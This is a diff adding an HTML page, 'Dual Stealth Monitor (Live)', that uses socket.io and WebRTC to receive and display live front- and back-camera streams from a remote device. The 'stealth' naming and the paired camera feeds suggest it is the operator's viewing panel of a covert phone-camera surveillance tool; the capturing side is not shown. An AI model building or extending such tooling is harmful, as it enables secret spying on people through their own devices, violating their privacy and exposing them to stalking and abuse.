@@ -1,0 +1,56 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <title>Dual Monitor</title>
+    <style>
+        body { background: #111; color: white; text-align: center; font-family: sans-serif; }
+        .box { display: flex; justify-content: center; gap: 15px; flex-wrap: wrap; padding: 20px; }
+        .cam { width: 45%; min-width: 320px; background: #000; border: 2px solid #333; border-radius: 10px; padding: 10px; }
+        video { width: 100%; border-radius: 5px; background: #222; }
+        h3 { color: #f85606; margin-bottom: 5px; }
+    </style>
+</head>
+<body>
+    <h2>🚀 Dual Stealth Monitor (Live)</h2>
+    <div class="box">
+        <div class="cam">
+            <h3>👤 Front Camera</h3>
+            <video id="front" autoplay playsinline controls></video>
+        </div>
+        <div class="cam">
+            <h3>🌍 Back Camera</h3>
+            <video id="back" autoplay playsinline controls></video>
+        </div>
+    </div>
+
+    <script src="/socket.io/socket.io.js"></script>
+    <script>
+        const socket = io();
+        const pcF = new RTCPeerConnection();
+        const pcB = new RTCPeerConnection();
+
+        socket.emit("ready");
+
+        pcF.ontrack = e => document.getElementById("front").srcObject = e.streams[0];
+        pcB.ontrack = e => document.getElementById("back").srcObject = e.streams[0];
+
+        socket.on("offer-front", async o => {
+            await pcF.setRemoteDescription(new RTCSessionDescription(o));
+            const a = await pcF.createAnswer();
+            await pcF.setLocalDescription(a);
+            socket.emit("answer-front", a);
+        });
+
+        socket.on("offer-back", async o => {
+            await pcB.setRemoteDescription(new RTCSessionDescription(o));
+            const a = await pcB.createAnswer();
+            await pcB.setLocalDescription(a);
+            socket.emit("answer-back", a);
+        });
+
+        socket.on("ice-front", c => pcF.addIceCandidate(new RTCIceCandidate(c)));
+        socket.on("ice-back", c => pcB.addIceCandidate(new RTCIceCandidate(c)));
+    </script>
+</body>
+</html>
+
